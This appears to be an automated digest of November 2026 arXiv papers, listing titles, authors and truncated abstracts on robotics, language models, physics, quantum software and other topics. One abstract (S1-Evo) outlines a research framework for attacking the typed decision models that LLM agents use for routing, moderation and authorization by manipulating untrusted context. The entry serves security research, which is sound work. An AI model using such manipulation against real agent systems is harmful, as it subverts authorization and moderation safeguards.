  We describe our solution for the 2026 BEHAVIOR Challenge: 100 long-horizon household tasks in the OmniGibson simulator. We placed 9th on the final leaderboard, the only independent team in the top 10. The core of the solution is a single vision-language-action (VLA) model, one checkpoint for all 100 tasks, built on our 1st-place 2025 solution, which is based on $π_{0.5}$. On the 50 tasks shared with 2025, its Q rises from 0.260 to 0.371; across all 100 tasks it scores 0.392. Our main conclusion ...
  </details>

- **2026-11-10** — Yupeng Han, Kai Zhang, Shuochen Liu et al. — [Personalized Memory Rubrics: Learning What to Remember per User via Rubric-Guided Credit Assignment](http://arxiv.org/abs/2611.14017v1)
  <details><summary>📄 Abstract</summary>
  Long-horizon personalized agents maintain an evolving memory by continuously deciding what to add, modify, or discard. However, learning an optimal update policy remains challenging. Conventional training relies solely on terminal question-answering accuracy, yielding a coarse feedback signal that treats all intermediate updates identically. Furthermore, update utility is inherently user-specific, as identical memory actions may yield opposite effects across different user personas. Existing met...
  </details>

- **2026-11-10** — Fantong Meng, Chengjie Sun, Shuangjia Yang et al. — [One Sequence Is Enough: Fingerprinting Language Models from Fixed-Length Integer Sequences](http://arxiv.org/abs/2611.14010v1)
  <details><summary>📄 Abstract</summary>
  Users of model APIs and third-party platforms often rely on the declared model name to identify the model responding to their requests. However, the actual model may differ from the declared one, motivating identity verification based on observable outputs. Previous studies have shown that preferences in simple numerical-choice tasks can serve as model fingerprints. We investigate whether a single fixed-length integer sequence can combine multiple numerical observations to identify its source mo...
  </details>

- **2026-11-10** — Niran Nataraj, Maina Sogabe, Masamichi Yamashita et al. — [TransGHOST: Real-Time, Synthesis-Free Reconstruction of Instrument-Occluded Regions in Ophthalmic Microsurgery](http://arxiv.org/abs/2611.13971v1)
  <details><summary>📄 Abstract</summary>
  Intraoperative scene perception in ophthalmic microsurgery is limited by instrument occlusion: when a tool enters the high-magnification field, it conceals tissue from both the surgeon and the perception components of robot-assisted systems that process the video. Generative inpainting can remove the occluder but replaces the missing image content with synthesis, which is unsuitable when visual provenance matters. Many video inpainters also depend on future frames and cannot operate online. We p...
  </details>

- **2026-11-10** — Qi Luo, Ziwen Wang, Kunlin Li et al. — [Scaling Shapley Energy Attribution to Large LLM Batches](http://arxiv.org/abs/2611.13802v1)
  <details><summary>📄 Abstract</summary>
  LLM services have become essential infrastructure for applications such as chat assistants and coding agents. Service providers need to attribute resource consumption to individual requests for purposes such as billing. Among these resources, energy is a key metric for assessing the cost of serving each request. However, serving engines batch requests together, and GPUs report only aggregate energy consumption. Providers typically estimate each request's share in proportion to its token consumpt...
  </details>

- **2026-11-09** — Mohamed Bachar, Ilyass Abouelaziz, Yuehua Ding — [Continuous-Time Set-Transformers for Asynchronous WiFi-IMU Indoor Localization](http://arxiv.org/abs/2611.13057v1)
  <details><summary>📄 Abstract</summary>
  Indoor localization commonly combines WiFi received signal strength indicator (RSSI) fingerprints with inertial measurements. However, these sensor streams are sampled asynchronously at different rates; therefore, observations rarely align in time and may be missing or stale. Most existing methods resample the data onto a shared clock and process each modality using a separate branch. We instead present a continuous-time transformer that represents observations as an unordered set of timestamped...
  </details>

- **2026-11-09** — James Rhodes, George Kang — [Beyond the Document: Compiled Context and Governed Agents for Any Work Product](http://arxiv.org/abs/2611.13055v1)
  <details><summary>📄 Abstract</summary>
  A document preserves the visible result of professional work but often discards the research, calculations, assumptions, evidence, and authorization boundaries behind it. We study a different unit of delivery: a Portable Agent Format (PAF) package that carries a work product together with compiled context, evidence, provenance, and rules for subsequent interaction. To test whether this context remains useful beyond the process that produced it, we evaluate four new packages, created after the ho...
  </details>

- **2026-11-09** — Jiongchi Yu, Yue Duan, Ziming Zhao et al. — [The Gene Is Not the Gate: Conceptualizing the Semantic Genome of Quantum Software](http://arxiv.org/abs/2611.13049v1)
  <details><summary>📄 Abstract</summary>
  Quantum software spans applications, program representations, compilers, runtimes, and hardware-facing control. Existing abstractions describe these artifacts and layers, but they do not capture the semantic responsibilities that must remain valid as a computation is transformed across the stack. This limits systematic reasoning about cross-layer correctness, evolution, and reuse.   We present QGenome, a semantic foundation for quantum software genomics. We define a quantum software gene as a ty...
  </details>


### 📂 benchmark
*安全评测与基准 / Safety Benchmarks & Evaluation* — 1 papers

- **2026-11-10** — Qinfeng Zhu, Weiguang Zhao, Ke Sun et al. — [LEASH: Stay Safe in Agentic Robotics](http://arxiv.org/abs/2611.14115v1)
  <details><summary>📄 Abstract</summary>
  Foundation models such as GPT and Claude have shown strong capabilities in spatial understanding and embodied intelligence. These advances make agentic robotics a promising path toward artificial general intelligence in robotics. However, we find that using foundation models to control robots poses serious safety risks, and comprehensive safety evaluation is still lacking. We introduce RoboRisk, a comprehensive benchmark for evaluating safety in agentic robotics. Its 92 simulated tasks and 13 ph...
  </details>


### 📂 survey
*综述与系统化 / Surveys & Systematization* — 7 papers

- **2026-11-12** — Wajiha Naveed, Brandon Fain — [Mind the Accuracy-Approval Gap: How Users Evaluate Sycophantic AI in Everyday Tasks](http://arxiv.org/abs/2611.16722v1)
  <details><summary>📄 Abstract</summary>
  Large language models (LLMs) often exhibit sycophancy, a tendency to agree with users, flatter or affirm them, and preserve their face, even when independent judgment or critical feedback would be more useful. Prior work has largely evaluated sycophancy through benchmark evaluations, but less is known about how users perceive and respond to sycophantic AI in everyday tasks. We combine benchmark evaluations with two large-scale user studies. We study four personas defined through system prompts: ...
  </details>

- **2026-11-12** — Qianjie Wei, Yifan Li, Zhen Bai — [Exploring Socially Acceptable 3D Feedback Design for Inclusive Small-Group Conversation](http://arxiv.org/abs/2611.17018v1)
  <details><summary>📄 Abstract</summary>
  Prior research has shown that providing feedback on group dynamics can improve the quality of small-group conversations. However, publicly delivered feedback that targets specific individuals may reduce social acceptability due to negative experiences such as social pressure, embarrassment, and resistance. This work investigates how public feedback can be designed to remain socially acceptable while maintaining its effectiveness in XR-based small-group conversations. Informed by social science a...
  </details>

- **2026-11-11** — Xiaoyu Liang, Virginia Ceccatelli, Aliai Eusebi et al. — [Where Is Uncertainty Observed? A Mechanistic Understanding of Uncertainty Quantification in LLMs](http://arxiv.org/abs/2611.15735v1)
  <details><summary>📄 Abstract</summary>
  Knowing when a large language model's (LLM's) response can be trusted is critical for its safe use. Uncertainty quantification (UQ) can help LLMs recognize if their responses may be unreliable. Existing taxonomies organize UQ methods by uncertainty source or estimation mechanism. They leave unresolved the question of where uncertainty is observed in the model's computation. The answer matters because the observation point determines whether an estimator has access to enough information to recove...
  </details>

- **2026-11-10** — Julie Zhu, Jianheng Hou, Zhixu Silvia Tao et al. — [Probe What-If Worlds Before You Ship: Persona Simulation for Real-World Decision Making](http://arxiv.org/abs/2611.14700v1)
  <details><summary>📄 Abstract</summary>
  User research and system testing reveal whether products and services meet user needs, yet recruiting specialized participants, designing controlled what-if comparisons, and repeating studies as designs evolve often bottleneck design iteration and data-driven decision-making. We present a framework and execution infrastructure that translates real-world industry inquiries into controlled experiments with simulated users. Our methodology formally defines the target cohort, experimental stimuli, a...
  </details>

- **2026-11-10** — Jingjing Jiang — [A Cross-Scenario Survey and Analysis of Self-Evolving Multimodal Agents](http://arxiv.org/abs/2611.14256v1)
  <details><summary>📄 Abstract</summary>
  Recent work shows that multimodal agents increasingly self-improve without recurring human annotation. However, each self-improvement mechanism is designed and evaluated within a single scenario, leaving its preconditions unverified under cross-scenario transfer. This survey investigates the structural source of asymmetric mechanism transfer across four scenarios: multimodal reasoning, multimodal generation, GUI and Web navigation, and embodied manipulation. We first formalize the self-evolving ...
  </details>

- **2026-11-10** — Javier Hernandez, Andrew D. Wilson — [PARLEY: Evaluating LLM Collaboration Through Cooperative Asymmetric Puzzles](http://arxiv.org/abs/2611.14242v1)
  <details><summary>📄 Abstract</summary>
  As large language models power autonomous agents, understanding how they collaborate and where they fail becomes critical. We introduce PARLEY, an extensible platform for studying LLM agent collaboration through four asymmetric puzzle tasks grounded in cognitive psychology (referential communication, joint coordination, perspective-taking, and spatial reasoning). GPT-4o agent pairs succeeded in 60.5% of conversations (N=400, 100 per task), with task-level variation (34-80%) reflecting distinct c...
  </details>

- **2026-11-10** — Shyam Agarwal, Olga Lvova, Agnia Sergeyuk et al. — [The AI Era's Lines of Code? A Case Study on What an Engineer's Token Spend Measures](http://arxiv.org/abs/2611.13396v1)
  <details><summary>📄 Abstract</summary>
  Organizations use engineers' token spend to monitor AI adoption, set budgets, and measure productivity, but the metric's relationship with engineering output is unclear. We link five weeks of token usage in coding agents to the commits of 404 engineers at JetBrains, and analyze a company survey of 412 employees. We find that token spend varied mostly between engineers, and which engineers spent the most stayed largely the same over the five weeks. Among weeks with similar commit counts, the 90th...
  </details>


### 📂 other
*其他安全相关 / Other Security-Related* — 223 papers

- **2026-11-12** — Geoffrey Challen, Craig Zilles — [Scalable Conversational Assessment: Chat-Based Exams with a Two-Agent LLM Pipeline](http://arxiv.org/abs/2611.17220v1)
  <details><summary>📄 Abstract</summary>
  Oral exams are compelling because (1) students can be asked to provide their reasoning for an answer and (2) their interactive nature permits follow-up questions to resolve ambiguous answers. But oral exams scale poorly. In this paper, we present scalable conversational assessment, an LLM-based system that conducts interactive text-based conversations with students to assess their ability to make and support an argument. We use a two-agent architecture to separate concerns and reduce the likelih...
  </details>

- **2026-11-12** — Kaixiang Wang, Junjie Li, Zhaojiacheng Zhou et al. — [S1-Evo: Experience-Guided Evidence Competition Attacks on Typed System-1 Decision Models](http://arxiv.org/abs/2611.16937v1)
  <details><summary>📄 Abstract</summary>
  Typed System-1 (S1) decision models are increasingly deployed in LLM agents for routing, moderation, and authorization to cut inference cost, yet untrusted context can still manipulate typed outputs and alter execution branches. Unlike autoregressive System-2 (S2) models, S1 interfaces score dynamic rules and options without token-by-token decoding, mismatching attacks targeting text continuation or explicit override commands. We propose S1-Evo, a self-evolving framework tailored to S1's contrac...
  </details>

- **2026-11-12** — Yanke Song, Shuo Chen, Chris Rockwell et al. — [Back to Pixels: Lifting Latent Video Diffusion into Pixel Space](http://arxiv.org/abs/2611.17336v1)
  <details><summary>📄 Abstract</summary>
  Frontier video generation models work in a VAE latent space that compresses video in both space and time. This compression made training tractable, but now limits high-resolution, controllable, and interactive generation -- doubling resolution quadruples token count, conditions apply to groups of frames rather than individual ones, and each response must wait for the rest of its multi-frame block. We present PixVid, a simple yet effective method that lifts a pretrained latent video model to dire...
  </details>

- **2026-11-12** — Ellis Brown, Chris Hoang, Shengyi Qian et al. — [Unbundling Multimodal Vision Encoding](http://arxiv.org/abs/2611.17334v1)
  <details><summary>📄 Abstract</summary>
  How multimodal language models should encode visual input remains up for debate. Most models use a pretrained vision encoder, while some recent recipes train the encoder from scratch with the language model or remove it entirely. Vision encoders bundle together three design choices: a visual prior from upstream pretraining, dedicated vision capacity, and pre-fusion placement of that capacity (i.e., before the multimodal backbone). Because published models also differ in data, architecture, and c...
  </details>

- **2026-11-12** — Minhae Oh, Jeonghye Kim, Jinwoo Koo et al. — [Learning When Diffusion Language Models Should Regenerate](http://arxiv.org/abs/2611.17320v1)
  <details><summary>📄 Abstract</summary>
  Remasking allows diffusion language models to revisit generated text, but effective correction requires knowing when and what to revise. Our diagnosis on Sudoku reveals two gaps. Hidden states contain error information that token confidence does not reliably expose, and remasking an isolated error usually reproduces it when the surrounding context remains fixed. These findings motivate DiVR , a verifier that predicts whether a partially generated sequence will reach a correct answer. Trained on ...
  </details>

- **2026-11-12** — Elnaserledinellah Mahmoud Abdelwahab — [Al-Ghasali: A Computational Framework for Simulating Islamic Jurisprudential Rulings via Finite State Automata and Large Language Models](http://arxiv.org/abs/2611.17235v1)
  <details><summary>📄 Abstract</summary>
  This paper presents Al Ghasali, a computational framework designed to formalize and simulate Islamic jurisprudential (Fiqh) rulings. Building upon recent set theoretic formalizations of al sabr wa al Taqsim that extract minimal operational rules as simple Horn clause logical programs, this work proves that the semantics of closed Fiqh chapters collapse completely to deterministic Finite State Automata (FSA). We establish a formal computational hierarchy, demonstrating that restricting formalizat...
  </details>

- **2026-11-12** — Jiachun Jin, Zetong Zhou, Haonan Wang et al. — [SALA: Semantically Aligned Latent Actions Enable Dual-Axis Scaling of Embodied Foundation Models](http://arxiv.org/abs/2611.17110v1)
  <details><summary>📄 Abstract</summary>
  Embodied foundation models hinge on diverse robot interaction data, which are costly to collect. Egocentric human videos offer a complementary source of experience, and latent action models (LAMs) provide a popular means of leveraging these videos for policy supervision. Compared with world-action models (WAMs), LAMs can offer greater training efficiency and potentially lower inference costs by avoiding explicit pixel prediction during policy learning and execution. However, most existing LAMs l...
  </details>

- **2026-11-12** — Anantajeet Devaraj, Navid Nasr Esfahani — [On cryptographically non-linear all-or-nothing transforms](http://arxiv.org/abs/2611.17102v1)
  <details><summary>📄 Abstract</summary>
  An unconditionally secure $(t, s, v)$-all-or-nothing transform (AONT) is a bijection from $s$ input elements to $s$ output elements over an alphabet of size $v$, such that given any $s - t$ output elements, no information can be obtained about any $t$ input elements. While linear AONTs have been extensively studied, comparatively little is known about the existence of non-linear AONTs. In this paper, we investigate unconditionally secure cryptographically non-linear $(t, s, v)$-AONTs, distinguis...
  </details>

- **2026-11-12** — Shuhan Li, Huankang Guan, Xintong Guo et al. — [AURA 2.0: From User-Driven Responses to Model-Initiated Conversations in Streaming Video](http://arxiv.org/abs/2611.17048v1)
  <details><summary>📄 Abstract</summary>
  Most AI assistants respond only when prompted, remaining silent even when events in the video stream offer meaningful opportunities for conversation. To move beyond purely user-driven interaction, we present AURA 2.0, a streaming video large language model that introduces three core upgrades to AURA. The key advance is Model-Initiated Conversation (MIC), which enables the model to identify topics worth discussing in the evolving visual stream and initiate conversations at appropriate moments wit...
  </details>

- **2026-11-12** — Ulysse Mizrahi, Sean Zaretzky, Dov Danon et al. — [ElasticDino: Dense Semantic Features Using Elastic Deformations](http://arxiv.org/abs/2611.16984v1)
  <details><summary>📄 Abstract</summary>
  Vision transformers (ViTs) serve as the backbone for countless vision tasks, including dense prediction tasks, such as segmentation and depth estimation, even though the quadratic complexity of self-attention severely limits feature resolution and induces spatial artifacts. In this work, we introduce ElasticDino, a lightweight adapter which produces high-resolution feature maps, adhering to the fine details of the input image. As a key insight, we observe the consistency of artifacts across chan...
  </details>

- **2026-11-12** — Joseph G. Bronyah, Nasir U. Eisty — [Non-Functional Requirements to Hyperparameter Translation for Quantum Software via LLMs](http://arxiv.org/abs/2611.16902v1)
  <details><summary>📄 Abstract</summary>
  Quantum software engineering (QSE) lacks validated approaches for translating natural-language non-functional requirements (NFRs) into execution parameters such as shots and transpiler optimization levels. Existing methods emphasize semantic similarity rather than execution outcomes. We evaluate seven large language models (LLMs) against a deterministic heuristic baseline using 540 synthetic and 18 real-world user stories. We assess semantic accuracy and execution outcomes, including time, cost,...
  </details>

- **2026-11-12** — Gabriel Manalu, Minh Son Hoang, Hyeontaek Hwang et al. — [Evaluating Video LLMs' Understanding of Corner Cases in Autonomous Driving](http://arxiv.org/abs/2611.16767v1)
  <details><summary>📄 Abstract</summary>
  Natural language explanations promised by modern Video Large Language Models (Video LLMs) offer autonomous driving systems a path toward detailed scene description and interpretable decision making on the road. While recent benchmarks have begun assessing these models on driving scenes, they mainly target routine traffic conditions and general comprehension tasks based on existing driving datasets and therefore fail to evaluate model performance on the rarest and most safety-critical driving eve...
  </details>

- **2026-11-12** — Alfio Massimiliano Gliozzo, Nandana Mihindukulasooriya, Gaetano Rossiello et al. — [FlinkEval: A Synthetic Corpus for Evaluating Natural Language Interfaces to Streaming SQL](http://arxiv.org/abs/2611.17093v1)
  <details><summary>📄 Abstract</summary>
  Existing natural-language-to-SQL benchmarks primarily evaluate queries over bounded relational data, leaving streaming semantics underexplored. We introduce FlinkEval, an execution-grounded synthetic benchmark comprising 3,903 question--SQL pairs across 45 industry domains and 45 semantic labels. We create diverse schemas and domain-plausible, temporally consistent data through iterative generation and validation. SQL patterns collected from the human-written NL2SQL pairs and vendor documentatio...
  </details>

- **2026-11-12** — Sergei Artemov, Benjamin Prud'homme — [Strategic disclosure and epistemic manipulation in extensive games](http://arxiv.org/abs/2611.17084v1)
  <details><summary>📄 Abstract</summary>
  In many strategic settings, agents can influence opponents by selectively disclosing truthful information about their own future actions. We introduce a game-theoretic framework to model this phenomenon. As a case study, we consider a two-player, alternating-move epistemic game in which Player A evaluates actions under a conservative maximin rule, while Player B-the manipulator-leverages this behavior by strategically revealing commitments. We prove that the manipulator can implement every induc...
  </details>

- **2026-11-12** — Deyao Hong, Jiayi Jiang, Yuchun Chen et al. — [Visual Cipher Bench: Benchmarking LLM Agents on Long-Horizon Visual Reasoning](http://arxiv.org/abs/2611.16861v1)
  <details><summary>📄 Abstract</summary>
  While language-model agents excel at long-horizon coding and terminal tasks, this success relies on two conditions: explicit text specifications and immediate execution feedback. However, neither condition holds in real-world problems where critical information exists only in images, leaving it unclear whether long-horizon capability transfers from text to visual reasoning. In such visual settings, because rules and clues resist text transcription and lack test-case feedback, agents must repeate...
  </details>

- **2026-11-12** — Mohamed Alimoussa, Amal El Kaid — [FLEX-LBP: Learning Local Binary Patterns with Exact Binary Inference for Texture Classification](http://arxiv.org/abs/2611.17302v1)
  <details><summary>📄 Abstract</summary>
  Local Binary Patterns (LBP) remain among the most widely used texture descriptors, from industrial inspection to medical imaging. Yet their radius, sampling angles, color transform and thresholds are fixed by hand for each dataset. We present FLEX-LBP, which learns these parameters by backpropagation while every forward pass computes exact binary codes and hard histogram counts. A straight-through estimator acts only in the backward pass, so the deployed descriptor is an interpretable hard-binar...
  </details>

- **2026-11-12** — Tiago de Souza Farias, Caio Moraes Porto, Matheus da Silva Fonseca et al. — [Programming Quantum Circuit Parameters with Large Language Models](http://arxiv.org/abs/2611.17246v1)
  <details><summary>📄 Abstract</summary>
  Large language models (LLMs) have recently demonstrated the ability to generate parameters for variational quantum circuits without conventional optimization. However, the conditions under which this approach is effective remain unclear. Here, we investigate a frozen, general-purpose LLM that generates complete circuit parameter vectors from symbolic circuit and Hamiltonian descriptions, with optional iterative energy feedback. We evaluate the approach on general random Hamiltonians, structured ...
  </details>

- **2026-11-12** — Anif N. Shikder, Ramit Dey, Jan Minac et al. — [Symmetry in Time: A Representation Theory of Linear Recurrent Memory](http://arxiv.org/abs/2611.17162v1)
  <details><summary>📄 Abstract</summary>
  State space models (SSMs) are an emerging alternative to Transformers. SSMs offer linear-time inference and parallel training, but most implementations make the parallel scan efficient by making the recurrence diagonal: each channel of the hidden state is multiplied by an input-dependent real or complex number. These numbers commute, so the state records which inputs occurred but not their order. We formalize this with representation theory, which explains and fixes the state-tracking failures p...
  </details>

- **2026-11-12** — Sebastian Brezina, Martin Krššák — [Gauge aspects of teleparallel gravity and Noether's second theorem](http://arxiv.org/abs/2611.17147v1)
  <details><summary>📄 Abstract</summary>
  We examine the gauge structure of the Teleparallel Equivalent of General Relativity (TEGR) from the perspective of Noether's second theorem. We show that diffeomorphisms and local Lorentz transformations are the gauge symmetries of TEGR, as these are the only variational symmetries that give rise to Noether identities. We then discuss the distinct roles of these two symmetries and their implications for the gauge-theoretic interpretation of gravity. Finally, we discuss consequences of these obse...
  </details>

- **2026-11-12** — Tanzeel Abbas, Ahmad Kamran Malik, Nafees Qamar et al. — [Parameter-Efficient Conciseness Adaptation: Differentiable Length Control for Concise Clinical Reasoning in Smaller Language Models](http://arxiv.org/abs/2611.17128v1)
  <details><summary>📄 Abstract</summary>
  Smaller language models (SLMs) make it feasible to deploy clinical natural language processing where large proprietary models are too costly, and parameter-efficient fine-tuning allows them to be specialised on commodity hardware. One obstacle persists after training: on medical tasks these models answer at far greater length than the clinical question requires. In clinical decision support and point-of-care use, where time is short, such verbosity is hard to act on even when the underlying reas...
  </details>

- **2026-11-12** — Sriom Chakrabarti, Sean Bin Yang, Arijit Khan et al. — [[Experiment, Analysis, and Benchmark] How well do LLMs comprehend and design relational database schemata?](http://arxiv.org/abs/2611.17044v1)
  <details><summary>📄 Abstract</summary>
  Large Language Models (LLMs) are increasingly used for database tasks, yet most work, such as Text2SQL, assumes that the relational schema already exists. We ask whether LLMs can design a schema from natural language requirements (Text2Schema), verbalize an existing schema (Schema2Text), and preserve its structure through a Schema-to-Text-to-Schema round trip. We present SchemaBridge, a benchmark of 902 schemata from three collections, stratified by size and constraint complexity, that scores fi...
  </details>

- **2026-11-12** — Tian Cai, Andrew Kleist, Jaimin Patel et al. — [AI for Biologists: The Knowledge Boundaries of Foundation Models in the Age of Agentic Systems](http://arxiv.org/abs/2611.17015v1)
  <details><summary>📄 Abstract</summary>
  Artificial intelligence (AI) is changing how biological research is done. Biological foundation models trained on millions of nucleotides, protein, and single-cell measurements predict protein structures, mutation effects, and cellular responses to genetic perturbations. Agentic systems, AI assistants built on large language models, can run multistep analyses from plain-language requests and increasingly call foundation models as tools. Yet it is often unclear when these models' outputs can be t...
  </details>

- **2026-11-12** — Calvin McPhail-Snyder — [A lift of Baxter's cyclic summation identity with applications to quantum topology](http://arxiv.org/abs/2611.16987v1)
  <details><summary>📄 Abstract</summary>
  While studying the chiral Potts model Baxter discovered a cyclic analogue of Ramanujan's ${}_1ψ_{1}$ summation identity. This identity was subsequently interpreted by Faddeev and Kashaev as a pentagon relation for the quantum dilogarithm function, a key ingredient in cyclic quantizations of Teichmüller theory. Existing forms of the identity involve multivalued functions so one must either accept overall phase ambiguities or keep track of branches on a complicated covering space. In this paper we...
  </details>

- **2026-11-12** — Stanislaw Mrowczynski, Maciej Pylak — [Why magnetic-field effects are difficult to observe in relativistic heavy-ion collisions](http://arxiv.org/abs/2611.16904v1)
  <details><summary>📄 Abstract</summary>
  Since a strong magnetic field is generated in relativistic heavy-ion collisions, novel phenomena have been predicted to occur in the quark-gluon plasma produced in these collisions. However, these predictions have not yet been convincingly confirmed experimentally. We reanalyze the generation and evolution of the magnetic field which plays a key role in the phenomena. Using the method of one-sided Fourier transformation, we reconcile the description in frequency and wave-vector space, which is r...
  </details>

- **2026-11-12** — Mahesh Madhav — [Control-Flow Profiling for Workload Representativeness](http://arxiv.org/abs/2611.16889v1)
  <details><summary>📄 Abstract</summary>
  Workload characterization in performance engineering often replaces expensive target executions with lower-cost proxies, including reduced datasets, miniapps, and training inputs. Such substitutions require empirical verification that the proxy faithfully exercises the target's dynamic execution behavior. This paper presents an address-keyed control-flow profiling methodology and tool suite designed to evaluate workload representativeness directly from compiled, unmodified binaries. We pair time...
  </details>

- **2026-11-12** —  Mariya — [Calibration and Conformal Prediction for Medical Question Answering in Arabic and English: Evidence from Two Non-Parallel Benchmarks](http://arxiv.org/abs/2611.16821v1)
  <details><summary>📄 Abstract</summary>
  Large language models (LLMs) are increasingly tested on medical exam questions, but accuracy alone does not show when an answer can be trusted. I study the calibration and uncertainty of two open-weight models, Qwen2.5-7B-Instruct and Jais-adapted-7B-chat (both run in 4-bit precision), on 2,816 English multiple-choice questions from MedMCQA and 4,927 Arabic multiple-choice questions from MedAraBench. Accuracy was 0.561 (English) and 0.430 (Arabic) for Qwen, and 0.369 and 0.308 for Jais. Raw opti...
  </details>

- **2026-11-12** — Yuliya Mishura, Kostiantyn Ralchenko, Mykyta Yakovliev — [Parameter estimation in models with explosive drift and Gaussian noise](http://arxiv.org/abs/2611.16790v1)
  <details><summary>📄 Abstract</summary>
  We study drift parameter estimation for a positive stochastic process with singular mean-reverting drift driven by Gaussian noise. For Riemann-Liouville fractional Brownian noise with Hurst parameter $H>1/2$, an observable fractional transformation reduces the model to a semimartingale with drift linear in the unknown parameters. Using the quasi-likelihood approach, we derive explicit estimators of both drift coefficients. For a broader class of Gaussian driving processes, we construct a strongl...
  </details>

- **2026-11-12** — Mathieu Blondel, Michaël E. Sander, Germain Vivier-Ardisson et al. — [On the Difficulty of Sequence-Level Supervised Learning for Autoregressive Language Models](http://arxiv.org/abs/2611.16736v1)
  <details><summary>📄 Abstract</summary>
  During the supervised learning phase, autoregressive language models are typically trained by minimizing the negative log-likelihood of the training data, which decomposes as a sum of token-level cross-entropies via teacher forcing. This objective is simple and efficient but potentially suffers from so-called exposure bias: a mismatch between the way the model is trained and the way it is used at inference time. Can we instead design sequence-level loss functions that incorporate inference-time ...
  </details>

- **2026-11-12** — Saurabh Prabhakar, Yubo Song, Pascal Schirmer et al. — [Transferable Neuromorphic Protection for Distribution Networks](http://arxiv.org/abs/2611.16702v1)
  <details><summary>📄 Abstract</summary>
  Protection of converter-dominated distribution networks is challenging due to limited fault currents, operating-mode transitions, bidirectional power flow, and heterogeneous network configurations. This paper proposes a scale-invariant neuromorphic protection framework to enable transferable protection decisions across such networks. The framework integrates asset-based normalization, multi-domain disturbance representation, event-driven spike encoding, leaky integrate-and-fire (LIF) dynamics, a...
  </details>

- **2026-11-12** — Shinichi Arimura, Yuchen Li, Julian Togelius — [Stack more levels: how to get general and human-like Mario playing](http://arxiv.org/abs/2611.16175v1)
  <details><summary>📄 Abstract</summary>
  Super Mario Bros. is widely used in game AI and procedural content generation (PCG), yet it remains unclear whether a model-free agent can reliably win unseen levels. To address this question, we train Proximal Policy Optimization (PPO) agents on increasingly large sets of PCG-generated Mario levels and evaluate their generalization on 1000 held-out test levels. We then shape competent PPO policies into three gameplay archetypes---runner, killer, and collector. Finally, we fine-tune these PPO po...
  </details>

- **2026-11-12** — Kooper de Lacy, Naoki Sato — [An Analytic Toroidal MHD Equilibrium with Trivial Euclidean Symmetry Group](http://arxiv.org/abs/2611.16688v1)
  <details><summary>📄 Abstract</summary>
  We provide a method to construct a real-analytic ideal MHD equilibrium $(B,p)$ in a solid toroidal domain $Ω\subset\mathbb{R}^{3}$, with $B$ tangential to the boundary $\partialΩ$. The regular pressure level sets foliate $Ω\setminusΓ$ by nested tori surrounding a magnetic axis $Γ$, with $\nabla p\neq0$ away from the axis. We construct an example where the magnetic field is nonvanishing on $Ω$, and the rotational transform equals 2 on every regular pressure surface. The equilibrium has a trivial ...
  </details>

- **2026-11-12** — Maximilian Maier, Tsz Kwan Emmy Wong, Jiahao Eric Yang et al. — [People prefer AI to human advice in multi-turn conversations but neither changes incentivised behaviour](http://arxiv.org/abs/2611.16667v1)
  <details><summary>📄 Abstract</summary>
  People increasingly ask AI chatbots for advice, yet large language models (LLMs) are sycophantic, overconfident, and can amplify human cognitive biases. In this article, we investigate how people perceive advice from humans versus LLMs and whether AI advice reshapes incentive-compatible donation decisions. Using Carrier, a new experimental platform, we designed an experiment where participants made a donation decision after discussing it with an AI chatbot advisor, another human, or receiving no...
  </details>

- **2026-11-12** — Jiancheng Pan, Yuzheng Liu, Hengyuan Cao et al. — [UniSpark: Exploring Hybrid Attention for Multimodal Understanding and Generation](http://arxiv.org/abs/2611.16517v1)
  <details><summary>📄 Abstract</summary>
  We present UniSpark-9B, a unified multimodal model that investigates hybrid attention for visual understanding and generation. Built on a Mixture-of-Transformer-Experts backbone with approximately 9B parameters in each branch, UniSpark combines full attention for explicit token interactions with GatedDeltaNet linear attention for compact context propagation. Autoregressive text prediction and visual flow matching jointly support visual question answering, text-to-image generation, instruction-gu...
  </details>

- **2026-11-12** — Jaehun Gim, Jaewoo Kim, Gyuwan Kim et al. — [SignRot: LLM Quantization with Massive Outlier-Aware Sign-Adjusted Rotation](http://arxiv.org/abs/2611.16502v1)
  <details><summary>📄 Abstract</summary>
  While quantization compresses LLMs and accelerates inference, outlier activations impede efficient low-bit representation. In particular, massive outliers cause substantial performance degradation. Although rotation-based methods that rely on randomized Hadamard transforms for online inference aim to mitigate this, they can produce fragmented distributions with empty bins when a massive outlier dominates a token's activation. This fragmentation severely undermines uniform quantization performanc...
  </details>

- **2026-11-12** — Ruimin Pei, Haibo Liu, Fang Zhang et al. — [FPSRG: Heterogeneous User Simulation First-Person Post-Training and Multidimensional Semantic Response Grids](http://arxiv.org/abs/2611.16445v1)
  <details><summary>📄 Abstract</summary>
  Simulating heterogeneous individuals with large language models is an active research direction, and heterogeneous user simulation requires models with different characteristics. We study profile construction: given dimensions, items, and scoring rules, build model configurations that can be retrieved by multidimensional target scores. We introduce First-Person Semantic Response Grids (FPSRG). Shared post-training first teaches the model to judge and answer as the participant; self-report and be...
  </details>

- **2026-11-12** — Wenhong Zhu, Xuefeng Li, Jiashuo Zhang et al. — [daVinci-Prover: Agent-Native Mid-Training for Formal Theorem Proving](http://arxiv.org/abs/2611.16433v1)
  <details><summary>📄 Abstract</summary>
  Advances in large language models (LLMs) are rapidly transforming formal theorem proving. Yet further progress remains constrained by the lack of a transparent and effective data recipe for systematically improving theorem-proving models. In this work, we argue that effective agentic provers require strong mathematical skill priors to ground theorem proving and agentic trajectories to enable long-horizon, interactive proof construction. To this end, we synthesize an agent-native 33.7B-token mid-...
  </details>

- **2026-11-12** — Xiangyi Jia, Kaixian Qu, Shengzhi Wang et al. — [I See What You Want: Decoding Hierarchical Operator Intent from Visual Teleoperation History](http://arxiv.org/abs/2611.16419v1)
  <details><summary>📄 Abstract</summary>
  Vision-language models (VLMs) have become a powerful foundation for robotic scene understanding, task planning, and language-conditioned control. A natural question follows: can these models also decode what a human operator intends while teleoperating a robot, without any explicit instruction? We formulate this as hierarchical intent prediction, jointly inferring the ongoing atomic action and the broader mission it serves from a short visual teleoperation history. To study this, we introduce VI...
  </details>

- **2026-11-12** — Muyu Zou, Haibo Xing, Shunye Tang et al. — [TriGen: A Generative Paradigm for Trigger-Induced Recommendation](http://arxiv.org/abs/2611.16395v1)
  <details><summary>📄 Abstract</summary>
  Generative recommendation typically operates under the User-Induced Recommendation (UIR) setting, predicting target items by autoregressively generating semantic IDs as a passive continuation of long-term user history. However, this paradigm overlooks Trigger-Induced Recommendation (TIR), an essential industrial scenario where a user click triggers an immediate follow-up feed. In TIR, recommendations must dynamically align with the instant trigger intent without compromising historical preferenc...
  </details>

